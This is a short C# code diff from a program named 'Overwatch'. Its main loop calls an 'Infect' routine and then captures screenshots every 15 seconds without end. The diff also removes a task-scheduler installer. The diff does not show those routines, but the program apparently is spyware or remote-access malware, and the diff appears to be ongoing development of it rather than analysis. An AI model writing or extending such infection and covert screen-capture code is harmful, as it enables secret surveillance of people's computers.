@@ -9,18 +9,17 @@ namespace Overwatch
     class cMain
     {
         static appLog Log = new appLog();
-        
+
         static void Main(string[] args)
         {
             try
             {
-                cInstallTaskScheduler Task = new cInstallTaskScheduler();
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
-
+                cReceiveInformation info = new cReceiveInformation();
                 while (true)
                 {
-                    cReceiveInformation.ScreenShoot();
+                    info.ScreenShoot();
                     System.Threading.Thread.Sleep(15000);
                 }
             }
